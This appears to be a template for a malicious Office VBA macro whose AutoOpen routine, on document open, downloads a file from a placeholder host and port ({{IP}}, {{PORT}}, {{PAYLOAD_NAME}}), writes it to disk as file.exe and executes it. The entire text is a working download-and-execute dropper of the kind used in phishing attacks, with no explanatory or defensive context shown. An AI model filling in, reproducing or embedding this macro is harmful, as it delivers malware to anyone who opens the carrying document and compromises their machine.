Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://{{IP}}:{{PORT}}/public/{{PAYLOAD_NAME}}", False
xHttp.Send

With bStrm
    .Type = 1 '//binary
    .Open
    .write xHttp.responseBody
    .savetofile "file.exe", 2 '//overwrite
End With

Shell ("file.exe")

End Sub